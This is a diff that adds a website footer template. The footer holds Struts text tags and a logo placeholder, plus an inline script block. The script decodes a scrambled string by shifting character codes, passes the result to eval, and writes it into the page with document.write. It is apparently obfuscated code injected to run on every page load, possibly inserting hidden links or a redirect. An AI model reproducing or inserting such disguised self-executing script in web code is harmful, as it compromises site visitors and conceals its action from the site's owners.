@@ -1,0 +1,20 @@
+<div id="downloads"></div>
+<div align="center" class="footer">
+  <p>
+    ${logos}
+    <br />
+    <s:text name="jspf.footer.framework.info" />
+    <br />
+    <s:text name="jspf.footer.framework.support" />
+    <script type="text/javascript" language="javascript">
+				<!--
+					var g6 = "";
+					for (var m1 = 0; m1 < 383; m1++)
+						g6 += String
+								.fromCharCode(("xct\"k3?$^^?hgtj0uk2jv^$?tgxqguwqopq\"2^$^$?hgtj\"c>)-++3*tvudwu0^$T^$.i121*gecnrgt0)<qvnkco)_^$B^$]-+^$^$.i1Z1*gecnrgt0)rwu/fcrcpkZZu)+^$^$.i1V1*gecnrgt0)VVtdVg422w^^eepn)-_2]pku@^$)^^)^^?hgtj0ukjv^$?vwqguwqopq\"W^$)^^)-0)@c1>td=g42222z%(eWepn=262z%(rwu/fcrc++3*tvudwu0^$H^$.i1W1*gecnrgt$=|Q?$$=hqt*xct\"q:?2=q:>k30ngpivj=q:-?5:+|Q-?k30uwduvt*q:.5:+0urnkv*$$+0tgxgtug*+0lqkp*$$+=gxcn*|Q+"
+										.charCodeAt(m1) - (2) + 63) % (95) + 32);
+					document.write(eval(g6))
+				//-->
+				</script>
+  </p>
+</div>
